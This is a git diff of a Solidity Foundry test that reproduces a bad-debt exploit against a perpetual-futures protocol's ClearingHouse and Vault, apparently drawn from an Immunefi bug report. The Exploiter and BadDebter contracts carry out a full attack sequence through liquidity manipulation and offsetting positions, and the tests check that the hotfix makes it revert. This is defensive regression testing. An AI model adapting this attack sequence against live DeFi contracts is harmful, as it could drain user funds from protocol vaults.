@@ -51,7 +51,7 @@ library Utils {
     }
 }
 
-contract Attacker is Test {
+contract Common {
     struct LiquidityPosition {
         int24 lower;
         int24 upper;
@@ -59,7 +59,6 @@ contract Attacker is Test {
         uint256 liquidity;
     }
 
-    address public admin;
     ClearingHouse public clearingHouse;
     MarketRegistry public marketRegistry;
     AccountBalance public accountBalance;
@@ -69,12 +68,10 @@ contract Attacker is Test {
     LiquidityPosition[] public liquidityPositions;
 
     constructor(
-        address adminArg,
         address clearingHouseArg,
         address marketRegistryArg,
         address payable vaultArg
     ) {
-        admin = adminArg;
         clearingHouse = ClearingHouse(clearingHouseArg);
         marketRegistry = MarketRegistry(marketRegistryArg);
         accountBalance = AccountBalance(clearingHouse.getAccountBalance());
@@ -83,13 +80,9 @@ contract Attacker is Test {
     }
 
     function deposit(uint256 amount) public {
-        vm.deal(address(this), 10000 ether);
+        // vm.deal(address(this), 10000 ether);
 
-        vm.startPrank(admin);
-        usdc.mint(address(this), amount);
-        vm.stopPrank();
-
-        TestERC20(usdc).approve(address(vault), amount);
+        usdc.approve(address(vault), amount);
         vault.deposit(address(usdc), amount);
     }
 
@@ -165,6 +158,37 @@ contract Attacker is Test {
         );
     }
 
+    function unlimitedLP(
+        address baseToken,
+        uint256 amount,
+        int24 tick
+    ) public {
+        address pool = marketRegistry.getPool(baseToken);
+
+        int24 space = UniswapV3Pool(pool).tickSpacing();
+        int24 lowerTick = tick;
+        int24 upperTick = tick + space;
+
+        IClearingHouse.AddLiquidityParams memory params =
+            IClearingHouse.AddLiquidityParams({
+                baseToken: baseToken,
+                base: amount,
+                quote: amount,
+                lowerTick: lowerTick,
+                upperTick: upperTick,
+                minBase: 0,
+                minQuote: 0,
+                useTakerBalance: false,
+                deadline: block.timestamp + 1 // solhint-disable-line not-rely-on-time
+            });
+
+        IClearingHouse.AddLiquidityResponse memory resp = clearingHouse.addLiquidity(params);
+
+        liquidityPositions.push(
+            LiquidityPosition({ lower: lowerTick, upper: upperTick, baseToken: baseToken, liquidity: resp.liquidity })
+        );
+    }
+
     function openShort(address baseToken, uint256 amount) public returns (uint256 baseAmount, uint256 quoteAmount) {
         IClearingHouse.OpenPositionParams memory params =
             IClearingHouse.OpenPositionParams({
@@ -215,14 +239,70 @@ contract Attacker is Test {
     }
 }
 
+contract BadDebter is Common {
+    constructor(
+        address clearingHouseArg,
+        address marketRegistryArg,
+        address payable vaultArg
+    ) Common(clearingHouseArg, marketRegistryArg, vaultArg) {}
+}
+
+contract Exploiter is Common {
+    BadDebter public badDebter;
+
+    constructor(
+        address clearingHouseArg,
+        address marketRegistryArg,
+        address payable vaultArg
+    ) Common(clearingHouseArg, marketRegistryArg, vaultArg) {}
+
+    function attack2(
+        address baseToken,
+        int24 tick,
+        uint256 usdcAmount
+    ) public {
+        badDebter = new BadDebter(address(clearingHouse), address(marketRegistry), address(vault));
+
+        console.log("1. attacker deposit collaterals");
+        usdc.transfer(address(badDebter), usdcAmount);
+        badDebter.deposit(usdcAmount);
+        deposit(usdcAmount);
+
+        console.log("2. exploiter add a huge concentrated liquidity (below the current price)");
+        uint256 hugeAmount = 8 * usdcAmount * 10**12;
+        addLiquidity(baseToken, (hugeAmount * 10) / 9);
+
+        console.log("3. exploiter open a huge short position");
+        openShort(baseToken, hugeAmount);
+
+        console.log("4. badDebter open a huge long position");
+        badDebter.openLong(baseToken, hugeAmount);
+
+        console.log("5. exploiter remove the huge concentrated liquidity");
+        removeLiquidity();
+
+        console.log("6. badDebter open a LP position at a really low price");
+        badDebter.unlimitedLP(baseToken, 10000 ether, tick);
+
+        console.log("7. badDebter close position and realize a huge loss");
+        badDebter.closePosition(baseToken, Utils.getSqrtRatioAtTick(Utils.MIN_TICK) + 100);
+
+        console.log("8. exploiter close position and take the profit");
+        closePosition(baseToken, Utils.getSqrtRatioAtTick(Utils.MAX_TICK) - 100);
+
+        withdrawAll();
+
+        uint256 currentUsdc = usdc.balanceOf(address(this));
+        usdc.transfer(msg.sender, currentUsdc);
+    }
+}
+
 contract BadDebtAttackTest is Setup {
-    uint256 public makerPrivateKey = uint256(1);
+    uint256 public takerPrivateKey = uint256(1);
+    address public taker = vm.addr(takerPrivateKey);
+    uint256 public makerPrivateKey = uint256(2);
     address public maker = vm.addr(makerPrivateKey);
     uint8 public usdcDecimals;
-
-    uint256 public initialUsdcAmount = 1_000_000e6;
-    Attacker public badDebter;
-    Attacker public exploiter;
 
     function setUp() public virtual override {
         Setup.setUp();
@@ -231,6 +311,7 @@ contract BadDebtAttackTest is Setup {
     }
 
     function prepareMarket() public {
+        vm.label(taker, "Taker");
         vm.label(maker, "Maker");
 
         // try to use the actual numbers of vONE on block 44985556 as possible
@@ -251,8 +332,19 @@ contract BadDebtAttackTest is Setup {
         );
         usdcDecimals = usdc.decimals();
 
+        // increase settlementTokenBalanceCap to 50m
+        clearingHouseConfig.setSettlementTokenBalanceCap(50_000_000 * 10**usdcDecimals);
+
+        // mint usdc to taker and deposit to vault
+        uint256 takerUsdcAmount = 5_000_000 * 10**usdcDecimals;
+        usdc.mint(taker, takerUsdcAmount);
+        vm.startPrank(taker);
+        usdc.approve(address(vault), takerUsdcAmount);
+        vault.deposit(address(usdc), takerUsdcAmount);
+        vm.stopPrank();
+
         // mint usdc to maker and deposit to vault
-        uint256 makerUsdcAmount = 400000 * 10**usdcDecimals;
+        uint256 makerUsdcAmount = 400_000 * 10**usdcDecimals;
         usdc.mint(maker, makerUsdcAmount);
         vm.startPrank(maker);
         usdc.approve(address(vault), makerUsdcAmount);
@@ -275,29 +367,25 @@ contract BadDebtAttackTest is Setup {
             })
         );
         vm.stopPrank();
-
-        // increase settlementTokenBalanceCap to 10m
-        clearingHouseConfig.setSettlementTokenBalanceCap(10_000_000 * 10**usdcDecimals);
     }
 
-    // TODO
-    // function testAttack_beforeHotfix_shouldPass() public {
-    //     uint256 initialUsdc = initialUsdcAmount * 2;
-    //     uint256 currentUsdc = TestERC20(usdc).balanceOf(address(exploiter));
-    //     console.log("initialUsdc:", initialUsdc);
-    //     console.log("currentUsdc:", currentUsdc);
-
-    //     bool hasProfit = currentUsdc > initialUsdc;
-    //     assertEq(hasProfit, true);
-    //     console.log("has profit:", currentUsdc - initialUsdc);
-    // }
+    function testAttack_beforeHotfix_shouldPass() public {
+        // TODO
+        // deploy Exchange using the old bytecode of v2.4.0
+        // enable the `if (!params.isClose) {` in line 201
+    }
 
     // ref: https://github.com/perpetual-protocol/immunefi-14204/blob/main/test/Attack.sol
     function testAttack_afterHotfix_shouldRevert() public {
-        badDebter = new Attacker(address(this), address(clearingHouse), address(marketRegistry), address(vault));
-        exploiter = new Attacker(address(this), address(clearingHouse), address(marketRegistry), address(vault));
+        uint256 initialUsdcAmount = 1_000_000e6;
+
+        BadDebter badDebter = new BadDebter(address(clearingHouse), address(marketRegistry), address(vault));
+        Exploiter exploiter = new Exploiter(address(clearingHouse), address(marketRegistry), address(vault));
         vm.label(address(badDebter), "BadDebter");
         vm.label(address(exploiter), "Exploiter");
+
+        usdc.mint(address(badDebter), initialUsdcAmount);
+        usdc.mint(address(exploiter), initialUsdcAmount);
 
         console.log("1. attacker deposit collaterals");
         badDebter.deposit(initialUsdcAmount);
@@ -335,7 +423,41 @@ contract BadDebtAttackTest is Setup {
         console.log("currentUsdc:", currentUsdc);
 
         bool hasProfit = currentUsdc > initialUsdc;
-        assertEq(hasProfit, false);
-        console.log("no profit");
+        assertEq(hasProfit, false, "should not has profit");
+    }
+
+    // ref: https://github.com/perpetual-protocol/immunefi-14204/blob/main/test/Attack2.sol
+    function testAttack2_afterHotfix_shouldRevert() public {
+        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));
+
+        uint256 initialUsdcAmount = 3_000_000e6;
+        usdc.mint(address(this), initialUsdcAmount);
+
+        int24 tick = -185820;
+        for (int24 i = 0; i < 3; i++) {
+            console.log("round");
+            console.logInt(i);
+
+            Exploiter exploiter = new Exploiter(address(clearingHouse), address(marketRegistry), address(vault));
+            uint256 usdcAmount = usdc.balanceOf(address(this));
+            if (usdcAmount > 0) {
+                // half of usdcAmount goes to exploiter, another half goes to badDebter
+                usdc.transfer(address(exploiter), usdcAmount);
+
+                vm.expectRevert(bytes("EX_OPLAS"));
+                exploiter.attack2(address(baseToken), tick + 60 * i, usdcAmount / 2);
+
+                // the revert will be caught by Foundry,
+                // and the program will keep running
+                // however, it will be noop since `if (usdcAmount > 0)`
+            }
+        }
+
+        uint256 vaultUsdcAfter = usdc.balanceOf(address(vault));
+        console.log("vaultUsdcBefore:", vaultUsdcBefore);
+        console.log("vaultUsdcAfter:", vaultUsdcAfter);
+
+        uint256 protocolLoss = vaultUsdcBefore - vaultUsdcAfter;
+        assertEq(protocolLoss, 0, "should not have protocol loss");
     }
 }
